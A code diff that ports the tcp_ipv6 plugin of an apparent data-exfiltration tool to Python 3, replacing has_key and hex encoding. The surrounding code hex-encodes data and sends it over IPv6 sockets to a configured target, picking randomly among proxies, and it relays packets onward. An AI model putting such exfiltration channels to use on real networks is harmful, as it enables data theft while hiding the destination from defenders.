@@ -1,3 +1,4 @@
+from binascii import hexlify
 import socket
 import sys
 from random import choice
@@ -9,7 +10,7 @@ config = None
 app_exfiltrate = None
 
 def send(data):
-    if config.has_key('proxies') and config['proxies'] != [""]:
+    if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
         target = choice(targets)
     else:
@@ -19,7 +20,7 @@ def send(data):
         'info', "[tcp_ipv6] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
     client_socket.connect((target, port))
-    client_socket.send(data.encode('hex'))
+    client_socket.send(hexlify(data.encode()))
     client_socket.close()
 
 def listen():
@@ -64,7 +65,7 @@ def relay_tcp_packet(data):
         'info', "[proxy] [tcp_ipv6] Relaying {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
     client_socket.connect((target, port))
-    client_socket.send(data.encode('hex'))
+    client_socket.send(hexlify(data.encode()))
     client_socket.close()
 
 def proxy():
